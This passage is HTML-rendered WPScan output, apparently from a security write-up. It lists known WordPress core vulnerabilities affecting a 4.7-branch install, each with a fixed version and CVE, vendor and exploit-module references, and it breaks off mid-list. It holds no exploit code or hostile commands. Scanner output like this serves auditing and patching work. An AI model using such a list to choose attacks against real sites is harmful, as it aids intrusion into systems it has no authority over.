class="number">-12895</span></span><br><span class="line"> |      - https://blog.ripstech.com/<span class="number">2018</span>/wordpress-file-delete-to-code-execution/</span><br><span class="line"> |      - http://blog.vulnspy.com/<span class="number">2018</span>/<span class="number">06</span>/<span class="number">27</span>/<span class="type">Wordpress</span><span class="number">-4</span><span class="number">-9</span><span class="number">-6</span>-<span class="type">Arbitrary</span>-<span class="type">File</span>-<span class="type">Delection</span>-<span class="type">Vulnerbility</span>-<span class="type">Exploit</span>/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/c9dce0606b0d7e6f494d4abe7b193ac046a322cd</span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">07</span>/wordpress<span class="number">-4</span><span class="number">-9</span><span class="number">-7</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://www.wordfence.com/blog/<span class="number">2018</span>/<span class="number">07</span>/details-<span class="keyword">of</span>-an-additional-file-deletion-vulnerability-patched-<span class="keyword">in</span>-wordpress<span class="number">-4</span><span class="number">-9</span><span class="number">-7</span>/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">Authenticated</span> <span class="type">File</span> <span class="type">Delete</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e3ef8976<span class="number">-11</span>cb<span class="number">-4854</span><span class="number">-837</span>f<span class="number">-786</span>f43cbdf44</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20147</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">Authenticated</span> <span class="type">Post</span> <span class="type">Type</span> <span class="type">Bypass</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">999</span>dba5a<span class="number">-82</span>fb<span class="number">-4717</span><span class="number">-89</span>c3<span class="number">-6</span>ed723cc7e45</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20152</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |      - https://blog.ripstech.com/<span class="number">2018</span>/wordpress-post-<span class="class"><span class="keyword">type</span>-privilege-escalation/</span></span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">PHP</span> <span class="type">Object</span> <span class="type">Injection</span> via <span class="type">Meta</span> <span class="type">Data</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">046</span>ff6a0<span class="number">-90</span>b2<span class="number">-4251</span><span class="number">-98</span>fc-b7fba93f8334</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20148</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">Authenticated</span> <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>)</span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">3182002</span>e-d831<span class="number">-4412</span>-a27d-a5e39bb44314</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20153</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>) that could affect plugins</span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">7</span>f7a0795<span class="number">-4</span>dd7<span class="number">-417</span>d<span class="number">-804e-54</span>f12595d1e4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20150</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/fb3c6ea0618fcb9a51d4f2c1940e9efcd4a2d460</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">User</span> <span class="type">Activation</span> <span class="type">Screen</span> <span class="type">Search</span> <span class="type">Engine</span> <span class="type">Indexing</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">65</span>f1aec4<span class="number">-6</span>d28<span class="number">-4396</span><span class="number">-88</span>d7<span class="number">-66702</span>b21c7a2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20151</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.0</span> - <span class="type">File</span> <span class="type">Upload</span> to <span class="type">XSS</span> on <span class="type">Apache</span> <span class="type">Web</span> <span class="type">Servers</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.12</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d741f5ae<span class="number">-52</span>ca<span class="number">-417</span>d-a2ca-acdfb7ca5808</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2018</span><span class="number">-20149</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2018</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-0</span><span class="number">-1</span>-security-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/<span class="number">246</span>a70bdbfac3bd45ff71c7941deef1bb206b19a</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> <span class="number">3.7</span><span class="number">-5.0</span> (except <span class="number">4.9</span><span class="number">.9</span>) - <span class="type">Authenticated</span> <span class="type">Code</span> <span class="type">Execution</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">5.0</span><span class="number">.1</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">1</span>a693e57-f99c<span class="number">-4</span>df6<span class="number">-93</span>dd<span class="number">-0</span>cdc92fd0526</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-8942</span></span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-8943</span></span><br><span class="line"> |      - https://blog.ripstech.com/<span class="number">2019</span>/wordpress-image-remote-code-execution/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/multi/http/wp_crop_rce</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> <span class="number">3.9</span><span class="number">-5.1</span> - <span class="type">Comment</span> <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>)</span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.13</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d150f43f<span class="number">-6030</span><span class="number">-4191</span><span class="number">-98</span>b8<span class="number">-20</span>ae05585936</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-9787</span></span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/<span class="number">0292</span>de60ec78c5a44956765189403654fe4d080b</span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">03</span>/wordpress<span class="number">-5</span><span class="number">-1</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://blog.ripstech.com/<span class="number">2019</span>/wordpress-csrf-to-rce/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.2</span> - <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>) <span class="keyword">in</span> <span class="type">URL</span> <span class="type">Sanitisation</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.14</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">4494</span>a903<span class="number">-5</span>a73<span class="number">-4</span>cad<span class="number">-8</span>c14<span class="number">-1e7</span>b4da2be61</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-16222</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">09</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-3</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/<span class="number">30</span>ac67579559fe42251b5a9f887211bf61a8ed68</span><br><span class="line"> |      - https://hackerone.com/reports/<span class="number">339483</span></span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Stored</span> <span class="type">XSS</span> <span class="keyword">in</span> <span class="type">Customizer</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d39a7b84<span class="number">-28</span>b9<span class="number">-4916</span>-a2fc<span class="number">-6192</span>ceb6fa56</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17674</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Unauthenticated</span> <span class="type">View</span> <span class="type">Private</span>/<span class="type">Draft</span> <span class="type">Posts</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">3413</span>b879<span class="number">-785</span>f<span class="number">-4</span>c9f-aa8a<span class="number">-5</span>a4a1d5e0ba2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17671</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/f82ed753cf00329a5e41f2cb6dc521085136f308</span><br><span class="line"> |      - https://<span class="number">0</span>day.work/proof-<span class="keyword">of</span>-concept-for-wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-3</span>-viewing-unauthenticated-posts/</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Stored</span> <span class="type">XSS</span> <span class="keyword">in</span> <span class="type">Style</span> <span class="type">Tags</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d005b1f8<span class="number">-749</span>d<span class="number">-438</span>a<span class="number">-8818</span><span class="number">-21</span>fba45c6465</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17672</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">JSON</span> <span class="type">Request</span> <span class="type">Cache</span> <span class="type">Poisoning</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">7804</span>d8ed<span class="number">-457</span>a<span class="number">-407e-83</span>a7<span class="number">-345</span>d3bbe07b2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17673</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/b224c251adfa16a5f84074a3c0886270c9df38de</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Server</span>-<span class="type">Side</span> <span class="type">Request</span> <span class="type">Forgery</span> (<span class="type">SSRF</span>) <span class="keyword">in</span> <span class="type">URL</span> <span class="type">Validation</span> </span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">26</span>a26de2-d598<span class="number">-405</span>d-b00c<span class="number">-61</span>f71cfacff6</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17669</span></span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17670</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/<span class="number">9</span>db44754b9e4044690a6c32fd74b9d5fe26b07b2</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.2</span><span class="number">.3</span> - <span class="type">Admin</span> <span class="type">Referrer</span> <span class="type">Validation</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.15</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">715</span>c00e3<span class="number">-5302</span><span class="number">-44</span>ad-b914<span class="number">-131</span>c162c3f71</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-17675</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">10</span>/wordpress<span class="number">-5</span><span class="number">-2</span><span class="number">-4</span>-security-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/<span class="type">WordPress</span>/commit/b183fd1cca0b44a92f0264823dd9f22d2fd8b8d0</span><br><span class="line"> |      - https://blog.wpscan.com/wordpress/security/release/<span class="number">2019</span>/<span class="number">10</span>/<span class="number">15</span>/wordpress<span class="number">-524</span>-security-release-breakdown.html</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.3</span> - <span class="type">Authenticated</span> <span class="type">Improper</span> <span class="type">Access</span> <span class="type">Controls</span> <span class="keyword">in</span> <span class="type">REST</span> <span class="type">API</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.16</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">4</span>a6de154<span class="number">-5</span>fbd<span class="number">-4</span>c80-acd3<span class="number">-8902</span>ee431bd8</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-20043</span></span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-16788</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-3</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-g7rg-hchx-c2gw</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.3</span> - <span class="type">Authenticated</span> <span class="type">Stored</span> <span class="type">XSS</span> via <span class="type">Crafted</span> <span class="type">Links</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.16</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">23553517</span><span class="number">-34e3</span><span class="number">-40</span>a9-a406-f3ffbe9dd265</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-16773</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-3</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://hackerone.com/reports/<span class="number">509930</span></span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/commit/<span class="number">1</span>f7f3f1f59567e2504f0fbebd51ccf004b3ccb1d</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-xvg2-m2f4<span class="number">-83</span>m7</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.3</span> - <span class="type">Authenticated</span> <span class="type">Stored</span> <span class="type">XSS</span> via <span class="type">Block</span> <span class="type">Editor</span> <span class="type">Content</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.16</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/be794159<span class="number">-4486</span><span class="number">-4</span>ae1-a5cc<span class="number">-5</span>c190e5ddf5f</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-16781</span></span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-16780</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-3</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-pg4x<span class="number">-64</span>rh<span class="number">-3</span>c9v</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt;= <span class="number">5.3</span> - wp_kses_bad_protocol() <span class="type">Colon</span> <span class="type">Bypass</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.16</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">8</span>fac612b<span class="number">-95</span>d2<span class="number">-477</span>a-a7d6-e5ec0bb9ca52</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2019</span><span class="number">-20041</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2019</span>/<span class="number">12</span>/wordpress<span class="number">-5</span><span class="number">-3</span><span class="number">-1</span>-security-and-maintenance-release/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/commit/b1975463dd995da19bb40d3fa0786498717e3c53</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.1</span> - <span class="type">Password</span> <span class="type">Reset</span> <span class="type">Tokens</span> <span class="type">Failed</span> to <span class="type">Be</span> <span class="type">Properly</span> <span class="type">Invalidated</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.17</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">7</span>db191c0-d112<span class="number">-4</span>f08-a419-a1cd81928c4e</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-11027</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>/</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">47634</span>/</span><br><span class="line"> |      - https://www.wordfence.com/blog/<span class="number">2020</span>/<span class="number">04</span>/unpacking-the<span class="number">-7</span>-vulnerabilities-fixed-<span class="keyword">in</span>-todays-wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>-security-update/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-ww7v-jg8c-q6jw</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.1</span> - <span class="type">Unauthenticated</span> <span class="type">Users</span> <span class="type">View</span> <span class="type">Private</span> <span class="type">Posts</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.17</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/d1e1ba25<span class="number">-98</span>c9<span class="number">-4</span>ae7<span class="number">-8027</span><span class="number">-9632</span>fb825a56</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-11028</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>/</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">47635</span>/</span><br><span class="line"> |      - https://www.wordfence.com/blog/<span class="number">2020</span>/<span class="number">04</span>/unpacking-the<span class="number">-7</span>-vulnerabilities-fixed-<span class="keyword">in</span>-todays-wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>-security-update/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span>-xhx9<span class="number">-759</span>f<span class="number">-6</span>p2w</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.1</span> - <span class="type">Authenticated</span> <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>) <span class="keyword">in</span> <span class="type">Customizer</span></span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.17</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/<span class="number">4</span>eee26bd-a27e<span class="number">-4509</span>-a3a5<span class="number">-8019</span>dd48e429</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-11025</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>/</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">47633</span>/</span><br><span class="line"> |      - https://www.wordfence.com/blog/<span class="number">2020</span>/<span class="number">04</span>/unpacking-the<span class="number">-7</span>-vulnerabilities-fixed-<span class="keyword">in</span>-todays-wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>-security-update/</span><br><span class="line"> |      - https://github.com/<span class="type">WordPress</span>/wordpress-develop/security/advisories/<span class="type">GHSA</span><span class="number">-4</span>mhg-j6fx<span class="number">-5</span>g3c</span><br><span class="line"> |</span><br><span class="line"> | [!] <span class="type">Title</span>: <span class="type">WordPress</span> &lt; <span class="number">5.4</span><span class="number">.1</span> - <span class="type">Cross</span>-<span class="type">Site</span> <span class="type">Scripting</span> (<span class="type">XSS</span>) <span class="keyword">in</span> wp-object-cache</span><br><span class="line"> |     <span class="type">Fixed</span> <span class="keyword">in</span>: <span class="number">4.7</span><span class="number">.17</span></span><br><span class="line"> |     <span class="type">References</span>:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e721d8b9-a38f<span class="number">-44</span>ac<span class="number">-8520</span>-b4a9ed6a5157</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=<span class="type">CVE</span><span class="number">-2020</span><span class="number">-11029</span></span><br><span class="line"> |      - https://wordpress.org/news/<span class="number">2020</span>/<span class="number">04</span>/wordpress<span class="number">-5</span><span class="number">-4</span><span class="number">-1</span>/</span><br><span class="line"> |      - https://core.trac.wordpress.org/changeset/<span class="number">47637</span>/</span><br><span class="line"> |      